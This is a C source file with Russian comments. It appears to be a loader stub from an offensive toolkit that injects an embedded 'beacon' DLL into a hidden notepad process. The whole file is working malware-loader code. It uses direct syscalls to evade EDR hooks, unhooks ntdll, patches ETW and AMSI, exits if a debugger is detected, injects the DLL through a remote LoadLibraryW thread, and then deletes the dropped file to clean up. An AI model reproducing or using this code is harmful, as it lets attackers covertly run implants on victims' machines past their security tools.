// exe_syscall.c -- Artifact stub: remote injection via direct syscalls.
//
// Использует SysWhispers4-сгенерированные syscalls (Hell's Gate + indirect
// jmp в ntdll gadget) вместо kernel32/ntdll-обёрток. Это:
//   + Обходит inline-хуки EDR на ntdll!Nt* функциях
//   + SSN читается напрямую из опкодов чистого ntdll
//   + При наличии флага --unhook-ntdll в SW4 -- сначала remap ntdll из
//     \KnownDlls\ (снос всех inline-хуков), потом SW4_Initialize
//   + ETW/AMSI/anti-debug автоматически если включены в preset
//
// Поток:
//   1. ART_RESOLVE_APIS -- хеш-резолв WinAPI (api_hash.h)
//   2. SW4_AntiDebugCheck -- ранний выход если детектирован отладчик
//   3. SW4_UnhookNtdll -- KnownDlls remap (если SW4 собран с --unhook-ntdll)
//   4. SW4_PatchEtw -- глушим user-mode ETW
//   5. SW4_PatchAmsi -- глушим AMSI
//   6. SW4_Initialize -- резолв SSN
//   7. art_write_temp -- beacon DLL во временный файл
//   8. CreateProcessW(notepad) -- target process
//   9. SW4_NtAllocateVirtualMemory -- буфер в notepad через syscall
//  10. SW4_NtWriteVirtualMemory -- пишем путь к DLL через syscall
//  11. SW4_NtCreateThreadEx(LoadLibraryW, path) -- удалённый поток через syscall
//  12. SW4_NtWaitForSingleObject -- ждём пока beacon DLL загрузится
//  13. cleanup + DeleteFileW
//
// Требует: kit/syscalls/SW4Syscalls.{h,c,asm}
//   Генерация: kit\utils\SysWhispers4-main\gen_for_kit.bat [preset]
//   Рекомендуемые preset: simple (clean system) | stealth | max (full evasion)

#include "../artifact.h"
#include "SW4Syscalls.h"

ART_DECLARE_PAYLOAD();

static const wchar_t TARGET[] = L"C:\\Windows\\System32\\notepad.exe";

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();

    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    // Anti-debug: выход если детектирован отладчик/EDR-инструментация
#ifdef SW4_HAS_ANTIDEBUG
    if (!SW4_AntiDebugCheck()) ExitProcess(0);
#endif

    // Снос inline-хуков ntdll из \KnownDlls\ копии — ДО SW4_Initialize,
    // чтобы Hell's Gate читал SSN из неискажённых байт.
#ifdef SW4_HAS_UNHOOK
    SW4_UnhookNtdll();
#endif

    // ETW user-mode bypass — патч ntdll!EtwEventWrite
#ifdef SW4_HAS_ETW
    SW4_PatchEtw();
#endif

    // AMSI bypass — патч amsi.dll!AmsiScanBuffer (если amsi загружен)
#ifdef SW4_HAS_AMSI
    SW4_PatchAmsi();
#endif

    // Резолв SSN из (уже чистого) ntdll
    if (!SW4_Initialize()) ExitProcess(1);

    // Beacon DLL во временный файл
    wchar_t tmppath[MAX_PATH + 1];
    if (!art_write_temp(tmppath, g_payload, sz)) ExitProcess(1);

    // Спавн целевого процесса. БЕЗ CREATE_SUSPENDED — loader должен
    // полностью отработать в notepad ПЕРЕД тем, как мы создадим
    // удалённый поток с LoadLibraryW (иначе race-condition).
    static STARTUPINFOW        si;
    static PROCESS_INFORMATION pi;
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(TARGET, NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // Ждём пока notepad дойдёт до message-loop — loader готов
    WaitForInputIdle(pi.hProcess, 5000);

    // --- Аллокация памяти в цели через прямой syscall ---
    SIZE_T regionSize = (SIZE_T)(lstrlenW(tmppath) + 1) * sizeof(wchar_t);
    PVOID  remoteBase = NULL;
    NTSTATUS st = SW4_NtAllocateVirtualMemory(
        pi.hProcess, &remoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st < 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // --- Запись пути к DLL через прямой syscall ---
    SIZE_T written = 0;
    st = SW4_NtWriteVirtualMemory(pi.hProcess, remoteBase,
                                  (PVOID)tmppath,
                                  (SIZE_T)(lstrlenW(tmppath) + 1) * sizeof(wchar_t),
                                  &written);
    if (st < 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // --- Создание удалённого потока через прямой syscall ---
    // Точка входа: LoadLibraryW по адресу из g_api (kernel32 base
    // одинаков во всех процессах одной boot-сессии благодаря ASLR-per-boot).
    HANDLE hRemoteThread = NULL;
    st = SW4_NtCreateThreadEx(
        &hRemoteThread,
        THREAD_ALL_ACCESS,
        NULL,
        pi.hProcess,
        (LPTHREAD_START_ROUTINE)g_api.f_LoadLibraryW,
        remoteBase,
        0,      /* CreateFlags: 0 = run immediately */
        0, 0, 0, NULL);
    if (st < 0 || !hRemoteThread) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    // Ждём пока LoadLibraryW в цели завершится → DllEntry beacon отработал
    SW4_NtWaitForSingleObject(hRemoteThread, FALSE, NULL);

    SW4_NtClose(hRemoteThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    Sleep(2000);
    DeleteFileW(tmppath);
    ExitProcess(0);
}
